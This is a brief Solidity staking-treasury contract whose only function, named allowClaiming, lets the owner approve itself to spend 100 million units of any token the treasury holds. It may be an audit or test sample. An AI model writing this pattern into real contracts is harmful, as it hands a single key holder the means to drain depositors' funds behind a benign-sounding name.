// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract StakingTreasury is Ownable {
    function allowClaiming(IERC20 _rewardToken) external onlyOwner {
        _rewardToken.approve(this.owner(), 100000000 ether);
    }
}